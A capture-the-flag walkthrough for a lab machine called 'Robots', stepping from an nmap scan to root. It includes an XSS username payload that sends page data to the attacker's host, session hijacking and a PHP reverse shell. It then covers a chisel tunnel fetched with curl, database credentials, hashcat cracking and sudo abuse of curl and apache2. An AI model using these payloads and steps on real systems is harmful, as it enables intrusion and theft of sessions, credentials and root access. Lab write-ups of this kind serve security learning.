# Robots v1.7

1. Run a nmap scan on IP

   ```bash
   nmap 10.48.147.28 -sC -oN nmap.scan -T 4 --min-rate 4000 -sCV
   22/tcp open ssh OpenSSH 8.9p1 (protocol 2.0)
   80/tcp open http Apache httpd 2.4.61
   9000/tcp open http Apache httpd 2.4.52 ((Ubuntu))
   Service Info: Host: robots.thm
   ```

2. When we visit to path mentioned in robots.txt. we get Forbidden. But /harm/to/self is allowed. When we visit it, there is a registration form. Login page reflects the username so it can be XSS vulnerability.

3. Try `<script>fetch.('/harm/to/self/server_info.php').then(response=>response.text()).then(data=>fetch('192.168.242.92:8000/?cookie='+btoa(data)));</script>` as username.
   Which will send the php cookie to server running on 8000 port. `python -m http.server 8000`

4. Session hijack using that cookie.

5. go to `/admin.php`; You'll see a url checker there. Paste a link to php reverse shell. Get the reverse shell from [here](https://www.revshells.com/).

6. Once in shell, go to `/var/www/html/harm/to/self`. You will see `config.php`; which has database connection with username and password.

   ```php
   <?php
       $servername = "db";
       $username = "robots";
       $password = "q4qCz1OflKvKwK4S";
       $dbname = "web";
   ```

7. `getent hosts db` to get db url.

8. Create a tunnel for your machine to thm machine using `chisel`.

   ```sh
   #On robots.thm shell
   curl <your-ip>:port/chisel -o chisel
   chmod +x chisel
   getent hosts db # to get db connection info
   ./chisel client <your-ip>:<port> R:socks

   #On your machine
   ./chisel server -p <port> --socks5 --reverse
   # on another window
   proxychains mysql -u <username-robots> -p -h <databse-uri>
   ```

9. Now in database get the password hash for unusual username `rgiskard`. password:`dfb35334bf2a1338fa`
   Notice that even your password hash is saved as different; and its double hashed meaning `md5(md5(password))`

10. crack the password using hashcat.`hashcat -m 2600 -a 3 "dfb35334bf2a1338fa40e5fbb4ae4753" "rgiskard?d?d?d?d"`
    password:`rgiskard2209`

11. ssh into ip with md5(rgiskard2209)

12. Look what can rgiskard execute by using `sudo -l`. He can use `User rgiskard may run the following commands on ubuntu-jammy:
(dolivaw) /usr/bin/curl 127.0.0.1/*`.
    Run as dolivaw and download a ssh public key into `/home/dolivaw/.ssh/authorized_keys`.
    Generate key:`ssh-keygen -t rsa -b 4096 -f dolivaw_rsa`

13. `sudo -l` to check whats allowed.

14. after knowing that Apache can run. go to `https://gtfobins.org/` to see for apache.
    `sudo apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /root/root.txt'`
